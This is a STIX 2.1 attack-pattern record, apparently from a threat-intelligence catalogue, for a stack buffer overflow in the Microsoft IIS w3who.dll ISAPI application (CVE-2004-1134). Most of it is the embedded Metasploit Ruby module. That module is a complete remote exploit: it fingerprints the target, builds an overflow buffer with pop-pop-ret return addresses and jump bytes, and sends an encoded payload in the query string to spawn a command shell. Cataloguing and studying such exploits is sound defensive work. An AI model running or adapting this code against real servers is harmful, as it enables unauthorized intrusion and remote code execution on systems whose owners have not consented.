{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f87c9fe0-df6a-42cd-af45-b418491f3132",
    "created": "2024-08-14T16:55:57.134592Z",
    "modified": "2024-08-14T16:55:57.134596Z",
    "name": "Microsoft IIS ISAPI w3who.dll Query String Overflow",
    "description": " This module exploits a stack buffer overflow in the w3who.dll ISAPI application. This vulnerability was discovered Nicolas Gregoire and this code has been successfully tested against Windows 2000 and Windows XP (SP2). When exploiting Windows XP, the payload must call RevertToSelf before it will be able to spawn a command shell.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/isapi/w3who_query.rb",
            "external_id": "w3who_query.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1134"
        },
        {
            "source_name": "reference",
            "url": "http://www.exaprobe.com/labs/advisories/esa-2004-1206.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  # XXX: Needs custom body check. HttpFingerprint = { :pattern => [ // ] }\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft IIS ISAPI w3who.dll Query String Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the w3who.dll ISAPI\n        application. This vulnerability was discovered Nicolas\n        Gregoire and this code has been successfully tested against\n        Windows 2000 and Windows XP (SP2). When exploiting Windows\n        XP, the payload must call RevertToSelf before it will be\n        able to spawn a command shell.\n\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1134' ],\n          [ 'OSVDB', '12258' ],\n          [ 'URL', 'http://www.exaprobe.com/labs/advisories/esa-2004-1206.html' ],\n          [ 'BID', '11820' ]\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 632,\n          'BadChars' => \"\\x00\\x2b\\x26\\x3d\\x25\\x0a\\x0d\\x20\",\n          'MinNops'  => 128,\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Automatic Detection', { }],\n          ['Windows 2000 RESKIT DLL [Windows 2000]', { 'Rets' => [  48,  0x01169f4a ] }], # pop, pop, ret magic\n          ['Windows 2000 RESKIT DLL [Windows XP]',   { 'Rets' => [ 748,  0x10019f4a ] }], # pop, pop, ret magic\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2004-12-06'))\n\n    register_options(\n      [\n        OptString.new('URL', [ true,  \"The path to w3who.dll\", \"/scripts/w3who.dll\" ]),\n      ])\n  end\n\n  def auto_target\n\n    res = send_request_raw(\n      {\n        'uri'   => normalize_uri(datastore['URL'])\n      }, -1)\n    http_fingerprint({ :response => res })  # XXX: Needs custom body match\n\n    # Was a vulnerable system detected?\n    t = nil\n    if (res and res.body =~ /Access Token/)\n      case res.headers['Server']\n      when /5\\.1/\n        t = targets[2]\n      else\n        t = targets[1]\n      end\n    end\n    t\n  end\n\n  def check\n    if auto_target\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    if (target.name =~ /Automatic/)\n      mytarget = auto_target\n    else\n      mytarget = target\n    end\n\n    if not mytarget\n      fail_with(Failure::NoTarget, \"No valid target found\")\n    end\n\n    buf = rand_text_english(8192, payload_badchars)\n    buf[mytarget['Rets'][0] - 4, 4] = make_nops(2) + \"\\xeb\\x04\"\n    buf[mytarget['Rets'][0] - 0, 4] = [ mytarget['Rets'][1] ].pack('V')\n    buf[mytarget['Rets'][0] + 4, 4] = \"\\xe9\" + [-641].pack('V')\n    buf[mytarget['Rets'][0] - 4 - payload.encoded.length, payload.encoded.length] = payload.encoded\n\n    print_status(\"Sending request...\")\n    r = send_request_raw({\n      'uri'   => normalize_uri(datastore['URL']),\n      'query' => buf\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-12-06",
    "x_mitre_platforms": [
        "win'"
    ]
}